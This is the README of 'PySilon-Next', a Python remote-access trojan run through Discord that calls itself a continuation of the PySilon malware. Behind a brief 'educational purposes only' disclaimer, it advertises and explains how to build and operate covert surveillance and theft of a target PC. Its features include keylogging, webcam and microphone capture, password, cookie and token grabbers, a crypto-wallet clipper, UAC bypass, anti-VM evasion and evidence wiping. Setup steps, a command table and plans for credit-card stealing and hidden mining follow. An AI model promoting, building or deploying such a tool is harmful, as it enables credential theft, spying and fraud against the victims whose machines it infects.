<span align='center'>

# PySilon-Next

<p align="center">
  <img src=".github/images/PySilonNextImage.png" width="500">
</p>

### The Next Generation of Python RAT
**Advanced Remote Administration Tool written in Python, fully controllable through Discord.**

[![Python](https://img.shields.io/badge/Python-3.13.9%2B-blue?style=for-the-badge&logo=python&logoColor=white)](https://www.python.org/)
[![Wiki](https://img.shields.io/badge/Wiki-Documentation-orange?style=for-the-badge&logo=gitbook&logoColor=white)](https://github.com/doshibadev/PySilon-Next/wiki)
[![License](https://img.shields.io/badge/License-MIT-green?style=for-the-badge)](LICENSE)

</span>

---

## ⚠️ Disclaimer

> **Information and code provided on this repository are for educational purposes only.**
> The creator is in no way responsible for any direct or indirect damage caused due to the misusage of the information. Everything you do, you are doing at your own risk and responsibility.

---

## ℹ️ About

**PySilon-Next** is a modern continuation of the legacy PySilon project. We have taken the original codebase to the next level by updating dependencies, adding support for the latest Python versions, and implementing new features while maintaining the core functionality that made the original powerful.

---

## 📋 Table of Contents
- [Features](#-features)
- [Premium Features](#-premium-features)
- [Preparation](#-preparation)
- [Available Commands](#-available-commands)
- [Donation](#-donation)
- [ToDo](#-todo)

---

## 🚀 Features

PySilon-Next allows you to control a target PC entirely through Discord:

*   **System Control**
    *   Handle multiple PCs simultaneously
    *   UAC Bypass (Gain *Administrative permissions* on startup)
    *   **Self-Destruct** (Delete itself remotely)
    *   Run *Shell* commands (CMD/Powershell)
    *   Browse, upload, download, and remove files
    *   Execute files
    *   Manage processes (View, Kill, Disable/Blacklist, Whitelist)
    *   Edit Registry
    *   Shutdown/Reboot/Logoff

*   **Surveillance**
    *   **Keylogger** (Log every key pressed)
    *   **Screenshots** (Take screenshots anytime)
    *   **Screen Recording** (Record screen on demand)
    *   **Webcam** (Take photos)
    *   **Microphone** (Record 24/7 audio, Stream live to voice channel)
    *   **Grabbers** (WiFi passwords, Browser history/cookies/passwords, Discord tokens, System info)

*   **Trolling & Fun**
    *   **Blue Screen of Death** (Trigger BSOD)
    *   **Fork Bomb** (Crash the PC)
    *   **Graphics Manipulation** (Glitch screen, draw bitmaps/text)
    *   **Monitor Control** (Turn monitors off/on)
    *   **Input Blocking** (Block mouse and keyboard)
    *   **Text-To-Speech** (Speak messages on target PC)
    *   **Audio Playback** (Play audio files in background)
    *   **Jumpscares** (Play loud videos/images)
    *   **Website Blocking** (Prevent access to specific sites)

*   **Advanced**
    *   **Critical Process** (Triggers BSOD if process is killed)
    *   **Crypto Clipper** (Replace copied wallet addresses with yours)
    *   **Anti-VM** (Detects and avoids VirtualBox, VMWare, etc.)
    *   **Debug Mode** (For easier testing)

---

## 💎 Premium Features

> **Coming Soon...**
>
> We are working on advanced, maintained modules that will be available for supporters. Stay tuned for updates!

---

## 🛠️ Preparation

1.  **Clone the repository:**
    ```bash
    git clone https://github.com/doshibadev/PySilon-Next
    cd PySilon-Next
    ```

2.  **Setup:**
    *   Follow the [Wiki Guide](https://github.com/doshibadev/PySilon-Next/wiki/Setup) to create your Discord Bot and Server.

3.  **Run the Builder:**
    *   **Windows:** Double click `PySilon.bat` or run in CMD.
    *   **Linux:** Run `bash PySilon-linux.sh`.

---

## 💻 Available Commands

| Command | Description |
| :--- | :--- |
| `.ss` | Take a screenshot at any time |
| `.screenrec` | Record the screen for 15 seconds |
| `.join` | Join voice-channel and stream live microphone input |
| `.grab <what>` | Grab sensitive data (passwords, cookies, tokens, etc.) |
| `.upload <type> [name]` | Upload a file to the target PC |
| `.download <path>` | Download a file from the target PC |
| `.cd <directory>` | Change working directory |
| `.ls` | List content of working directory |
| `.pwd` | Show current working directory |
| `.rm <path>` | Remove file or directory |
| `.exec <file>` | Run a file on the target PC |
| `.cmd <command>` | Execute shell command and get output |
| `.kill <pid/name>` | Kill a running process |
| `.blacklist <name>` | Block a process from running |
| `.whitelist <name>` | Allow a blocked process |
| `.block-input` | Block mouse and keyboard |
| `.unblock-input` | Unblock mouse and keyboard |
| `.monitors-off` | Turn off monitors |
| `.monitors-on` | Turn on monitors |
| `.bsod` | Trigger Blue Screen of Death |
| `.critical-enable` | Elevate process to critical (BSOD on kill) |
| `.implode` | Completely remove PySilon from target and clean evidence |

*For a full list of commands and detailed usage, check the [Wiki](https://github.com/doshibadev/PySilon-Next/wiki).*

---

## 💰 Donation

Support the development of PySilon-Next:

*   **XMR:** `INPUT_ADDRESS`
*   **BTC:** `INPUT_ADDRESS`
*   **ETH:** `INPUT_ADDRESS`
*   **LTC:** `INPUT_ADDRESS`

---

## 📝 ToDo

- [ ] Webhook connection fallback (in case of Bot Token ban)
- [ ] Enhanced System Info Grabber with Embeds
- [ ] Traditional Reverse Shell Creator
- [ ] Credit Card Grabber
- [ ] Optional Crypto Mining (Idle detection)
- [ ] Session Grabbers (Steam, Minecraft, Metamask, Exodus, Roblox)

---

<p align="center">
  Based on the original PySilon Malware.
</p>
